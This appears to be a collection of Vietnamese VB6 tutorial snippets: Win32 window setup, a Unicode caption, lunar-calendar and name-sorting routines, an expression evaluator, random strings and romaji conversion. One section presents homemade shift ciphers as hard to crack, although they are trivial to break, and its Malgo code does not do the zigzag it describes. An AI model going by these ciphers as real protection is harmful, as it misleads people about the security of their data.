Public Const WS_EX_NOPARENTNOTIFY As Long = &amp;H4&amp;
Public Const WS_EX_TOPMOST As Long = &amp;H8&amp;
Public Const WS_EX_TRANSPARENT As Long = &amp;H20&amp;
Public Const WS_GROUP As Long = &amp;H20000
Public Const WS_HSCROLL As Long = &amp;H100000
Public Const WS_ICONIC As Long = WS_MINIMIZE
Public Const WS_OVERLAPPED As Long = &amp;H0&amp;
Public Const WS_OVERLAPPEDWINDOW As Long = (WS_OVERLAPPED Or WS_CAPTION Or WS_SYSMENU Or WS_THICKFRAME Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX)
Public Const WS_POPUP As Long = &amp;H80000000
Public Const WS_POPUPWINDOW As Long = (WS_POPUP Or WS_BORDER Or WS_SYSMENU)
Public Const WS_SIZEBOX As Long = WS_THICKFRAME
Public Const WS_TILED As Long = WS_OVERLAPPED
Public Const WS_TILEDWINDOW As Long = WS_OVERLAPPEDWINDOW
Public Const CW_USEDEFAULT As Long = &amp;H80000000
Public Const CS_HREDRAW As Long = &amp;H2
Public Const CS_VREDRAW As Long = &amp;H1
Public Const IDI_APPLICATION As Long = 32512&amp;
Public Const IDC_ARROW As Long = 32512&amp;
Public Const WHITE_BRUSH As Integer = 0
Public Const BLACK_BRUSH As Integer = 4
Public Const WM_KEYDOWN As Long = &amp;H100
Public Const WM_CLOSE As Long = &amp;H10
Public Const WM_DESTROY As Long = &amp;H2
Public Const WM_PAINT As Long = &amp;HF
Public Const SW_SHOWNORMAL As Long = 1
Public Const DT_CENTER As Long = &amp;H1
Public Const DT_SINGLELINE As Long = &amp;H20
Public Const DT_VCENTER As Long = &amp;H4
 
Sub Main()
 
Call vbWinMain
 
End Sub
 
Public Function vbWinMain() As Long
 
Const CLASSNAME = "Hello_VB"
Const TITLE = "Hello VB"
Dim hwnd As Long
Dim wc As WNDCLASSEX
Dim message As MSG
 
    ' Set up and register window class
    wc.cbSize = Len(wc)
    wc.style = CS_HREDRAW Or CS_VREDRAW
    wc.lpfnWndProc = GetFuncPtr(AddressOf WindowProc)
    wc.cbClsExtra = 0&amp;
    wc.cbWndExtra = 0&amp;
    wc.hInstance = App.hInstance
    wc.hIcon = LoadIcon(App.hInstance, IDI_APPLICATION)
    wc.hCursor = LoadCursor(App.hInstance, IDC_ARROW)
    wc.hbrBackground = GetStockObject(WHITE_BRUSH)
    wc.lpszMenuName = 0&amp;
    wc.lpszClassName = CLASSNAME
    wc.hIconSm = LoadIcon(App.hInstance, IDI_APPLICATION)
    
    RegisterClassEx wc
 
    
    ' Create a window
    hwnd = CreateWindowEx(0&amp;, _
                        CLASSNAME, _
                        TITLE, _
                        WS_OVERLAPPEDWINDOW, _
                        CW_USEDEFAULT, _
                        CW_USEDEFAULT, _
                        CW_USEDEFAULT, _
                        CW_USEDEFAULT, _
                        0&amp;, _
                        0&amp;, _
                        App.hInstance, _
                        0&amp;)
    
    ' Show the window
    ShowWindow hwnd, SW_SHOWNORMAL
    UpdateWindow hwnd
    SetFocus hwnd
    
    'enter message loop
    '(all window messages are handles in WindowProc())
    Do While 0 &lt;&gt; GetMessage(message, 0&amp;, 0&amp;, 0&amp;)
        TranslateMessage message
        DispatchMessage message
    Loop
    
    vbWinMain = message.wParam
End Function
 
 
Public Function WindowProc(ByVal hwnd As Long, ByVal message As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
'Main message handler for this program
Dim ps As PAINTSTRUCT
Dim rc As RECT
Dim hdc As Long
Dim str As String
 
Select Case message
    'Handle 3 select messages "manually"
    Case WM_PAINT
        hdc = BeginPaint(hwnd, ps)
        Call GetClientRect(hwnd, rc)
        str = "Hello Visual Basic 6!"
        Call DrawText(hdc, str, Len(str), rc, DT_SINGLELINE Or DT_CENTER Or DT_VCENTER)
        Call EndPaint(hwnd, ps)
        Exit Function
 
    Case WM_KEYDOWN
        Call PostMessage(hwnd, WM_CLOSE, 0, 0)
        Exit Function
        
    Case WM_DESTROY
        PostQuitMessage 0&amp;
        Exit Function
        
    Case Else
    'pass all other messages to default window procedure
        WindowProc = DefWindowProc(hwnd, message, wParam, lParam)
        
End Select
 
 
End Function
 
Function GetFuncPtr(ByVal lngFnPtr As Long) As Long
    'wrapper function to allow AddressOf to be used within VB
    GetFuncPtr = lngFnPtr
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093419103420</MaVD>
    <NoiDung>Private Declare Function GetModuleHandleW Lib "kernel32" (ByVal lpModuleName As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function GetWindowLongA Lib "user32" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLongA Lib "user32" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetWindowLongW Lib "user32" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetWindowTextW Lib "user32" (ByVal hWnd As Long, ByVal lpString As Long) As Long
 
Private Const GWL_WNDPROC = -4
 
Private m_Caption As String
 
Public Property Get CaptionW() As String
    CaptionW = m_Caption
End Property
Public Property Let CaptionW(ByRef NewValue As String)
    Static WndProc As Long, VBWndProc As Long
    m_Caption = NewValue
    ' get window procedures if we don't have them
    If WndProc = 0 Then
        ' the default Unicode window procedure
        WndProc = GetProcAddress(GetModuleHandleW(StrPtr("user32")), "DefWindowProcW")
        ' window procedure of this form
        VBWndProc = GetWindowLongA(hWnd, GWL_WNDPROC)
    End If
    ' ensure we got them
    If WndProc &lt;&gt; 0 Then
        ' replace form's window procedure with the default Unicode one
        SetWindowLongW hWnd, GWL_WNDPROC, WndProc
        ' change form's caption
        SetWindowTextW hWnd, StrPtr(m_Caption)
        ' restore the original window procedure
        SetWindowLongW hWnd, GWL_WNDPROC, VBWndProc
    Else
        ' no Unicode for us
        Caption = m_Caption
    End If
End Property

Private Sub Form_Load()
CaptionW = "Tiêu " &amp; ChrW(&amp;H111) &amp; "" &amp; ChrW(&amp;H1EC1) &amp; " ti" &amp; ChrW(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW(&amp;H1EC7) &amp; "t - s" &amp; ChrW(&amp;H1B0) &amp; "u t" &amp; ChrW(&amp;H1EA7) &amp; "m b" &amp; ChrW(&amp;H1EDF) &amp; "i Nguy" &amp; ChrW(&amp;H1EC5) &amp; "n Trung Tín"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091216031207</MaVD>
    <NoiDung>Hàm bên dưới trả về số lần xuất hiện của ký tự (hoặc từ) Chars trong chuỗi OrigString truyền vào. Tham số cuối cùng mặc định là False: kg phân biệt hoa thường.

    Public Function CharCount(ByVal OrigString As String, _
    ByVal Chars As String, Optional ByVal CaseSensitive As Boolean = False) _
    As Long

        '**********************************************
       'PURPOSE: Returns Number of occurrences of a character or
       'or a character sequencence within a string

        'PARAMETERS:
       'OrigString: String to Search in
       'Chars: Character(s) to search for
       'CaseSensitive (Optional): Do a case sensitive search
       'Defaults to false

        'RETURNS:
       'Number of Occurrences of Chars in OrigString

        'EXAMPLES:
       'Debug.Print CharCount("FreeVBCode.com", "E") -- returns 3
       'Debug.Print CharCount("FreeVBCode.com", "E", True) -- returns 0
       'Debug.Print CharCount("FreeVBCode.com", "co") -- returns 2
       ''**********************************************

        Dim lLen As Long
        Dim lCharLen As Long
        Dim lAns As Long
        Dim sInput As String
        Dim sChar As String
        Dim lCtr As Long
        Dim lEndOfLoop As Long
        Dim bytCompareType As Byte

        sInput = OrigString
        If sInput = "" Then Exit Function
        lLen = Len(sInput)
        lCharLen = Len(Chars)
        lEndOfLoop = (lLen - lCharLen) + 1
        bytCompareType = IIf(CaseSensitive, vbBinaryCompare, _
           vbTextCompare)

        For lCtr = 1 To lEndOfLoop
            sChar = Mid(sInput, lCtr, lCharLen)
            If StrComp(sChar, Chars, bytCompareType) = 0 Then _
                lAns = lAns + 1
        Next

        CharCount = lAns

    End Function


Sử dụng:
1. Có bao nhiêu chữ a trong "caulacbovb.com":
        count = CharCount("caulacbovb.com", "a")

2. Mở rộng ra tính số lần xuất hiện của các ký tự a, b, c, .... trong chuỗi:
        Dim i As Byte, str As String
        For i = 65 To 122   'Tu A - z
           str = str &amp; "So ky tu " &amp; Chr(i) &amp; " : " &amp; CharCount(TextBox1.Text, Chr(i)) &amp; vbCrLf
        Next i


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092116032102</MaVD>
    <NoiDung>Vì là code rút gọn tối đa nên bạn phải cung cấp số liệu cho từng năm DL
* Dòng 7, bạn gõ ngày tết dương lịch của năm mới
* Dòng 10, trong hàm Split có 14 số
- Số đầu là tháng nhuận AL, nếu năm không nhuận, gõ số 13
- số thứ 2 là ký hiệu đủ-thiếu của tháng AL vào ngày tết DL: 1 là đủ, 0 là thiếu
- các số tiếp theo là tháng tiếp theo, số cuối tương ứng với tháng AL của tháng 12 DL
* Dòng 11, sau dấu cọng bạn gõ ngày AL tương ứng ngày tết DL; vd 1/1/2010 có AL là 17/11, ta gõ 17
* Dòng 12, gõ tháng AL vào ngày tết DL
Chỉ thế thôi, với Function ToAL sau đây, bạn có thể tạo lịch bất cứ năm nào
(Nếu bạn không thích từng năm phải tự cung cấp số liệu, mời xem bài lịch vạn năm của bạn vie87vn. Các số liệu trong các bài viết về lịch của tôi đều dùng lịch của bạn vie87vn)

Dim NgàyAL As Integer, TênNgàyAL As String, ThángAL As Integer, TênThángAL As String, Nam As Integer, TênNaM As String, Nh As String
 
Private Function ToAL(data As Date)
Dim Can() As String, Chi() As String, TêTDL As Date
Can = Split("Canh,Tân,Nhâm,Qúy,Giáp,Ât,Bính,Ðinh,Mâu,Ky", ",")
Chi = Split("Thân,Dâu,Tuâ't,Ho'i,Tý,Su'u,Dâ'n,Mão,Thìn,Ty,Ngo,Mùi", ",")
TêTDL = #1/1/2010#  ' &lt;-- Cung câ'p sô' liêu
 
Dim DuLieu() As String, i As Byte, DaysAL As Byte
DuLieu = Split("13,1,1,1,0,1,0,1,0,0,1,0,1,0", ",") ' Nam AL không nhuân ghi sô' 13, nhuân ghi tháng nhuân  ' &lt;-- Cung câ'p sô' liêu
NgàyAL = DateDiff("d", TêTDL, data) + 17 ' Cong thêm ngày AL vào ngày 1/1/2010  ' &lt;-- Cung câ'p sô' liêu
  ThángAL = 11 ' Ghi tháng AL vào ngày 1/1/2010  ' &lt;-- Cung câ'p sô' liêu
    For i = 1 To 13
        DaysAL = 29 + CByte(DuLieu(i))
            
            If NgàyAL &gt; DaysAL Then
                NgàyAL = NgàyAL - DaysAL
                If i = DuLieu(0) + 1 Then ' Chi dùng cho tháng nhuân
                    ThángAL = ThángAL ' Chi dùng cho tháng nhuân
                    Nh = " (Nh)" ' Chi dùng cho tháng nhuân
                Else
                    ThángAL = ThángAL + 1
                End If
                If ThángAL &gt; 12 Then ThángAL = ThángAL - 12
            Else
                Exit For
            End If
    Next
 
TênNgàyAL = Can(DateDiff("d", #4/1/1800#, data) Mod 10) &amp; " " &amp; Chi(DateDiff("d", #4/1/1800#, data) Mod 12)
TênThángAL = Can((Nam * 12 + ThángAL + 7) Mod 10) &amp; " " &amp; Chi((ThángAL + 5) Mod 12)
 
    If ((ThángAL = 11) Or (ThángAL = 12)) And (data &lt; TêTDL + 60) Then ' Ðiê'u chinh tháng 11, 12 Ðâ'u nam DL
        Nam = Year(TêTDL) - 1
    Else
        Nam = Year(TêTDL)
    End If
TênNaM = Can(Nam Mod 10) &amp; " " &amp; Chi(Nam Mod 12)
 
End Function


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092516032530</MaVD>
    <NoiDung>Trong bài viết này, Alex xin trình bày với các anh em ba cách đơn giản để mã hóa một chuỗi ký tự, giới hạn ở phạm vi ASCII. Dùng một trong các cách này, hoặc phối hợp với nhau, chúng ta có thể biến chuỗi ký tự bình thường thành một nội dung không dễ dịch ngược nếu không có mật mã. Kỹ thuật cốt lõi là biến đổi ký tự theo một giá trị nhứt định, kiểu như "abc" thành "def", nhưng làm cho nó phức tạp lên một chút.
Vì tên gọi đầy đủ của các phương pháp hơi dài dòng nên xin dùng tạm các tên mã (codename).

Phương pháp 1: Malgo - Biến đổi ký tự theo kiểu lên xuống lần lượt
Cách thực hiện là lấy mã ASCII của ký tự rồi cộng hoặc trừ cho một giá trị (tạm gọi là Shifting value). Nếu ký tự trước được cộng mã, thì ký tự sau được trừ mã. Theo mặc định khi mã hóa sẽ thực hiện phép cộng ở ký tự đầu tiên, còn khi giải mã thì phép trừ được làm trước. Do bản chất của phương pháp này nên nó còn được gọi là Zigzag Shifting. Đây là phương pháp đơn giản nhứt trong số ba phương pháp. Chỉ cần biết giá trị biến đổi (một con số) là giải mã được.

'Mã hóa: sKetQua = Malgo(sChuoiCanMaHoa, sGiaTriBienDoi)
Function Malgo(ByVal src As String, ByVal v As Integer) As String
    Dim result As String
    Dim i%, f As Boolean
    For i = 1 To Len(src)
        result = result &amp; Chr(Asc(Mid$(src, i, 1)) + IIf(f, v, (-v)))
    Next i
    Malgo = result
End Function
 
'Giải mã: sKetQua = MalgoDecrypt(sChuoiDaMaHoa, iGiaTriBienDoi)
Function MalgoDecrypt(ByVal src As String, v As Integer) As String
    Dim result As String
    Dim i%, f As Boolean: f = True
    For i = 1 To Len(src)
        result = result &amp; Chr(Asc(Mid$(src, i, 1)) + IIf(f, v, (-v)))
    Next i
    MalgoDecrypt = result
End Function

Phương pháp 2: Federo - Biến đổi ký tự bằng cách cộng toàn chuỗi
Cách thực hiện là dùng một chuỗi khóa (Key String) để cộng vào chuỗi ban đầu. Thí dụ: chuỗi ban đầu là "abcdefgh", chuỗi khóa (hay mật mã) là "xyz" thì ta thực hiện (a+x, b+y, c+z, d+x, e+y, f+z, g+x, f+y). Phương pháp này cần một mật khẩu để giải mã.

'Mã hóa: sKetQua = Federo(sChuoiCanMaHoa, sMatKhau)
Function Federo(ByVal src As String, ByVal FStr As String) As String
    Dim result As String
    Dim i%, j%
    j = 1
    For i = 1 To Len(src)
        result = result &amp; Chr(Asc(Mid$(src, i, 1)) + Asc(Mid$(FStr, j, 1)))
        j = IIf((j = Len(FStr)), 1, j + 1)
    Next i
    Federo = result
End Function
 
'Giải mã: sKetQua = FederoDecrypt(sChuoiDuocMaHoa, sMatKhau)
Function FederoDecrypt(ByVal src As String, ByVal FStr As String) As String
    Dim result As String
    Dim i%, j%
    j = 1
    For i = 1 To Len(src)
        result = result &amp; Chr(Asc(Mid$(src, i, 1)) - Asc(Mid$(FStr, j, 1)))
        j = IIf((j = Len(FStr)), 1, j + 1)
    Next i
    FederoDecrypt = result
End Function

Phương pháp 3: Federo16 (HexaFedero) - Thập lục phân hóa và biến đổi bằng cách cộng toàn chuỗi
Cách thực hiện gồm 2 bước. Bước thứ nhứt là tính mã ASCII của ký tự ra hai chữ số thập lục phân. Cứ vậy mà thực hiện, thì tương ứng với mỗi ký tự ở chuỗi ban đầu, ta có hai chữ số thập lục phân từ mã ASCII của nó. Bước thứ nhì là mã hóa chuỗi thập lục phân bằng phương pháp Federo. Trong số ba phương pháp thì đây là phương pháp khó bẻ khóa nhứt, nhưng cũng sẽ làm nội dung ban đầu tăng gấp đôi kích thước.

'Mã hóa: sKetQua = Federo16(sChuoiCanMaHoa, sMatKhau)
Function Federo16(ByVal src As String, ByVal FStr As String) As String
    Dim result As String
    Dim temp$, h$, i%, j%
    j = 1
    For i = 1 To Len(src)
        h = Hex$(Asc(Mid$(src, i, 1)))
        If Len(h) = 1 Then h = "0" &amp; h
        temp = temp &amp; h
    Next i
    For i = 1 To Len(temp)
        result = result &amp; Chr(Asc(Mid$(temp, i, 1)) + Asc(Mid$(FStr, j, 1)))
        j = IIf((j = Len(FStr)), 1, j + 1)
    Next i
    Federo16 = result
End Function
 
'Giải mã: sKetQua = Federo16Decrypt(sChuoiDuocMaHoa, sMatKhau)
Function Federo16Decrypt(ByVal src As String, ByVal FStr As String) As String
    Dim result As String
    Dim temp$, i%, j%
    j = 1
    For i = 1 To Len(src)
        temp = temp &amp; Chr(Asc(Mid$(src, i, 1)) - Asc(Mid$(FStr, j, 1)))
        j = IIf((j = Len(FStr)), 1, j + 1)
    Next i
    For i = 1 To Len(temp) Step 2
        result = result &amp; Chr(CLng("&amp;H" &amp; Mid$(temp, i, 2)))
    Next i
    Federo16Decrypt = result
End Function



</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092916032948</MaVD>
    <NoiDung>Tip này chúng ta sẽ dùng hàm Spit để cắt phép toán ra từng mảnh và sử lý. Ví dụ ta có chuỗi "3+8-(2+4)*800-7" sẽ trả về 1 kết quả duy nhất.
Bạn tạo 1 Project mới, thêm vào 1 CommandButton, 1 Textbox (khỏi cần đặt lại Name)
copy code sau vào để test : 

Trong đây chúng ta chỉ quan tâm đến 2 hàm lớn là "TinhToan" (dùng để ra kết quả [double] của một chuỗi phép toán ko bao gồm dấu ngoặc) và hàm "ChiaDeTri" (Là chia để trị  dùng để chia các cụm có dấu ngoặc ra sử lý và trả lại 1 chuỗi sau khi sử lý xong phép toán trong ngoặc đó, ví dụ ta có chuỗi "5+(5-2)*2-(7+3)" thì trả về "5+3*2-10" để đưa cho hàm tính toán sử lý)

'Tac Gia : DQHung (Dương Quốc Hưng)
'Mo ta : Tinh toan mot chuoi phep tinh bao gom cac phep tinh va ca cap dau ngoac
'Ngay 24/08/2009
 
Private Sub Command1_Click()
    Me.Caption = TinhToan(ChiaDeTri(Text1))
End Sub
 
Public Function ChiaDeTri(ByVal sMath As String) As String
    Dim mStart As Long ' Vi tri cua dau (
    Dim mStop As Long  'Vi tri cua dau )
    Dim sTrongNgoac As String, sPhiaTruoc As String
    Dim Temp As Double
    
    If (InStr(sMath, "(") &gt; 0) And (InStr(sMath, ")") &gt; 0) Then
        mStart = InStr(sMath, "(")
        mStop = InStr(sMath, ")")
        
        sPhiaTruoc = Mid$(sMath, 1, mStart - 1)
        sTrongNgoac = Mid$(sMath, mStart + 1, Len(sMath) - mStart - (Len(sMath) - mStop) - 1)
        Temp = TinhToan(sTrongNgoac)
        ChiaDeTri = sPhiaTruoc &amp; Temp &amp; ChiaDeTri(Mid$(sMath, mStop + 1, Len(sMath) - mStop))
    Else
        ChiaDeTri = (sMath)
    End If
End Function
 
Public Function TinhToan(ByVal sMath As String) As Double
    sMath = Replace(sMath, "-", "+-")
    Dim v_Pheptoan As Variant, i As Long
    
    v_Pheptoan = Split(sMath, "+")
    For i = 0 To UBound(v_Pheptoan)
        If (InStr(v_Pheptoan(i), "/") &gt; 0) And InStr(v_Pheptoan(i), "*") = 0 Then
            v_Pheptoan(i) = Chia(v_Pheptoan(i))
        ElseIf (InStr(v_Pheptoan(i), "/") = 0) And (InStr(v_Pheptoan(i), "*") &gt; 0) Then
            v_Pheptoan(i) = Nhan(v_Pheptoan(i))
        Else
            v_Pheptoan(i) = Nhan(v_Pheptoan(i))
        End If
        TinhToan = TinhToan + Val(v_Pheptoan(i))
    Next
    Erase v_Pheptoan
End Function
 
Private Function Nhan(ByVal sMath As String) As Double
    Dim v_Nhan As Variant
    Dim i As Long, Temp As Double
    v_Nhan = Split(sMath, "*")
    Temp = 1
    For i = 0 To UBound(v_Nhan)
        If InStr(v_Nhan(i), "/") Then
            v_Nhan(i) = Chia(v_Nhan(i))
        End If
        Temp = Temp * Val(v_Nhan(i))
    Next i
    Nhan = Temp
    Erase v_Nhan
End Function
 
Private Function Chia(ByVal sMath As String) As Double
    Dim v_Chia As Variant
    Dim i As Long, Temp As Double
    v_Chia = Split(sMath, "/")
    
    For i = 0 To UBound(v_Chia)
        If InStr(v_Chia(i), "*") Then
            v_Chia(i) = Nhan(v_Chia(i))
        End If
        If i = 0 Then
            Temp = Val(v_Chia(0))
        Else
            Temp = Temp / Val(v_Chia(i))
        End If
    Next i
    Chia = Temp
    Erase v_Chia
End Function
 
Private Sub Text1_KeyPress(KeyAscii As Integer)
    If (InStr("1234567890+-*/.()", Chr(KeyAscii)) = 0) And (KeyAscii &lt;&gt; 8) And (KeyAscii &lt;&gt; 3) And (KeyAscii &lt;&gt; 22) Then
         KeyAscii = 0
    End If
End Sub


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093816033838</MaVD>
    <NoiDung>Module: sắp xếp tên họ tiếng Việt sau đây dựa:
Thanh: không, Huyền, Hỏi, Ngã, Sắc, Nặng
Thứ tự: ưu tiên ký tự trước, sắp thanh sau cùng


Public ListTên As New Collection
 
Public Function TachTên(ByVal HoTen As String) As String
Dim Tam() As String
Tam = Split(HoTen, " ")
TachTên = Tam(UBound(Tam))
End Function
  
  'truongphu 8/2009 Cam Ðu'c, Cam Ranh, Khánh Hòa
Public Function TáchHoLot(ByVal HoTen As String) As String
Dim Tam() As String
Tam = Split(HoTen, " ")
TáchHoLot = Replace(HoTen, TachTên(HoTen), "")
End Function
 
Public Function SôTenHo(ByVal HoTen As String) As String
Dim BoSung As String: BoSung = TachTên(HoTen)
If (Len(BoSung) &lt; 6) Then BoSung = BoSung &amp; String(6 - Len(BoSung), "A")
Dim BoSung2 As String: BoSung2 = Replace(TáchHoLot(HoTen), " ", "A")
If (Len(BoSung2) &lt; 14) Then BoSung2 = BoSung2 &amp; String(14 - Len(BoSung2), "A")
tenho = UCase(BoSung) &amp; UCase(BoSung2)
Dim KiTu2 As String '198
KiTu2 = "A" &amp; ChrW(192) &amp; ChrW(7842) &amp; ChrW(195) &amp; ChrW(193) &amp; ChrW(7840) &amp; ChrW(258) &amp; ChrW(7856) &amp; ChrW(7858) &amp; ChrW(7860) &amp; ChrW(7854) &amp; ChrW(7862) &amp; ChrW(194) &amp; ChrW(7846) &amp; ChrW(7848) &amp; ChrW(7850) &amp; ChrW(7844) &amp; ChrW(7852) _
&amp; "B^^^^^C^^^^^D^^^^^" &amp; ChrW(272) &amp; "^^^^^" _
&amp; "E" &amp; ChrW(200) &amp; ChrW(7866) &amp; ChrW(7868) &amp; ChrW(201) &amp; ChrW(7864) &amp; ChrW(202) &amp; ChrW(7872) &amp; ChrW(7874) &amp; ChrW(7876) &amp; ChrW(7870) &amp; ChrW(7878) _
&amp; "F^^^^^G^^^^^H^^^^^I" &amp; ChrW(204) &amp; ChrW(7880) &amp; ChrW(296) &amp; ChrW(205) &amp; ChrW(7882) &amp; "J^^^^^K^^^^^L^^^^^M^^^^^N^^^^^" _
&amp; "O" &amp; ChrW(210) &amp; ChrW(7886) &amp; ChrW(213) &amp; ChrW(211) &amp; ChrW(7884) &amp; ChrW(212) &amp; ChrW(7890) &amp; ChrW(7892) &amp; ChrW(7894) &amp; ChrW(7888) &amp; ChrW(7896) &amp; ChrW(416) &amp; ChrW(7900) &amp; ChrW(7902) &amp; ChrW(7904) &amp; ChrW(7898) &amp; ChrW(7906) _
&amp; "P^^^^^Q^^^^^R^^^^^S^^^^^T^^^^^U" &amp; ChrW(217) &amp; ChrW(7910) &amp; ChrW(360) &amp; ChrW(218) &amp; ChrW(7908) &amp; ChrW(431) &amp; ChrW(7914) &amp; ChrW(7916) &amp; ChrW(7918) &amp; ChrW(7912) &amp; ChrW(7920) _
&amp; "V^^^^^W^^^^^X^^^^^Y" &amp; ChrW(7922) &amp; ChrW(7926) &amp; ChrW(7928) &amp; ChrW(221) &amp; ChrW(7924) &amp; "Z^^^^^"
 
Dim i As Byte, j As String, k As Long, m As Integer
    For i = 1 To 20 '&lt;--
        k = (InStr(KiTu2, Mid(tenho, i, 1)) + 5) \ 6
        m = m + ((InStr(KiTu2, Mid(tenho, i, 1)) + 5) Mod 6)
        j = j &amp; CStr(Format((67 - k), "00"))    '&lt;--
        If i = 6 Then j = CStr(CDbl(j) - m)
    Next
SôTenHo = j
End Function
 
Public Sub XepTenHo(ByVal HoSo As Variant)
Dim i As Integer, j As Integer, k As Boolean, ListSô As New Collection
 
For i = 1 To UBound(HoSo)
    If i &gt; 1 Then
        For j = 1 To ListSô.Count
            If CDbl(SôTenHo(HoSo(i))) &gt; CDbl(ListSô.Item(j)) Then
                     ListSô.Add SôTenHo(HoSo(i)), , j
                        Dim Tam As String: Tam = TáchHoLot(HoSo(i))
                            If Len(Tam) &lt; 9 Then Tam = Tam &amp; vbTab
                     ListTên.Add Tam &amp; vbTab &amp; TachTên(HoSo(i)), , j
                k = True
                Exit For
            End If
        Next
        If k = False Then
                     ListSô.Add SôTenHo(HoSo(i))
                     ListTên.Add TáchHoLot(HoSo(i)) &amp; vbTab &amp; TachTên(HoSo(i))
        End If
        k = False
    Else
            ListSô.Add SôTenHo(HoSo(i))
            ListTên.Add TáchHoLot(HoSo(i)) &amp; vbTab &amp; TachTên(HoSo(i))
    End If
Next
End Sub

 
Sử dụng:
Form1 cần Command1, ListBox1 (MS 2.0)

Private Sub CommandButton1_Click()
Dim Temp() As String, i As Byte
ReDim Temp(1 To ListBox1.ListCount)
For i = 1 To ListBox1.ListCount
 Temp(i) = ListBox1.List(i - 1)
Next
Call SapTenHo2(Temp)
For i = 0 To ListBox1.ListCount - 1
 ListBox1.List(i) = ListTen(i + 1)
Next
End Sub
 
Private Sub Form_Load()
ListBox1.AddItem "Tr" &amp; ChrW(7847) &amp; "n B" &amp; ChrW(236) &amp; "nh B" &amp; ChrW(7843) &amp; "o"
ListBox1.AddItem "Nguy" &amp; ChrW(7877) &amp; "n Trung Bang"
ListBox1.AddItem ChrW(272) &amp; ChrW(7863) &amp; "ng Bá"
ListBox1.AddItem "Ph" &amp; ChrW(7841) &amp; "m Trung Ba"
ListBox1.AddItem "Nguy" &amp; ChrW(7877) &amp; "n Minh B" &amp; ChrW(7841)
ListBox1.AddItem "Tr" &amp; ChrW(7847) &amp; "n B" &amp; ChrW(236) &amp; "nh B" &amp; ChrW(227) &amp; "o"
ListBox1.AddItem "Tr" &amp; ChrW(7847) &amp; "n Minh Bà"
ListBox1.AddItem "L" &amp; ChrW(234) &amp; " v" &amp; ChrW(259) &amp; "n B" &amp; ChrW(7843) &amp; "n"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " Báo"
ListBox1.AddItem ChrW(272) &amp; ChrW(7863) &amp; "ng Thúc Bá"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " B" &amp; ChrW(7841) &amp; "n"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " B" &amp; ChrW(227) &amp; "i"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " B" &amp; ChrW(7841) &amp; "i"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " Bay"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " Bàng"
ListBox1.AddItem "So sánh v" &amp; ChrW(7899) &amp; "i" &amp; " Bái"
 
CommandButton1.Caption = "S" &amp; ChrW(7855) &amp; "p x" &amp; ChrW(7871) &amp; "p theo tên"
End Sub

các kiểu sắp khác, mời xem:</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094016034028</MaVD>
    <NoiDung>Private Function RandomString(NumChrOfStr As Integer) As String
    Dim sTmp As String
    sTmp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" 'Chuỗi gồm các kí tự dùng đến để phát sinh chuỗi ngẫu nhiên
    Dim i, RndPos As Integer
    Randomize
    For i = 1 To NumChrOfStr 'NumChrOfStr là số lượng kí tự của chuỗi cần phát sinh
        RndPos = Int(Len(sTmp) * Rnd + 1) 'Phát sinh một số ngẫu nhiên trong khoảng từ 1 tới len(sTmp)
        RandomString = RandomString &amp; Mid$(sTmp, RndPos, 1) 'Lấy ra 1 kí tự trogn chuỗi sTmp nằm ở vị trí số ngẫu nhiên vừa phát sinh
    Next i
End Function
'Test:
Private Sub Form_Load()
    Print RandomString(5)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094316034330</MaVD>
    <NoiDung>Public Function ToNihonGo(sRomajiInput As String) As String
    'Please do not remove these lines
    'ToNihonGo Function: Converting Romaji string to Hiragana or Katakana string
    'Author: vie87vn - Email: vie87vn@yahoo.com; vie87vn@gmail.com; vie87vn@zing.vn
    'From: http://www.caulacbovb.com
    'How to use: ToNihonGo("Nihongo") -&gt; にほんご
    
    Dim sRomaji As String, sTmp As String, sTmpArry() As String
    Dim sHiragana As String, sHiraganaArr() As String
    Dim iIsKatakana As Integer, iPlus As Integer, iC As Integer
    Dim I As Long, j As Long, k As Long, lPos As Long
    Dim sArr() As String, sRomajiTmp As String, sNoKatakana As String
    
    If Len(sRomajiInput) = 0 Then ToNihonGo = "": Exit Function
    
    iIsKatakana = 0
    iPlus = 0
    sTmp = ""
    sRomajiTmp = sRomajiInput
    
    'Chuyen doi A?o A^m
    Dim sTsu As String, sConv As String, sArrTsu() As String, sArrConv() As String
    sTsu = "tta,cchi,ttsu,ttu,tte,tto,ssa,ssi,sshi,ssu,sse,sso,ppa,ppi,ppu,ppe,ppo,kka,kki,kku,kke,kko,zza,zzi,zzu,zze,zzo,jja,jji,jju,jje,jjo,kkya,kkyi,kkyu,kkye,kkyo,zzya,zzyi,zzyu,zzye,zzyo,jjya,jjyi,jjyu,jjye,jjyo,ppya,ppyi,ppyu,ppye,ppyo,ssya,ssyi,ssye,ssyu,ssyo"
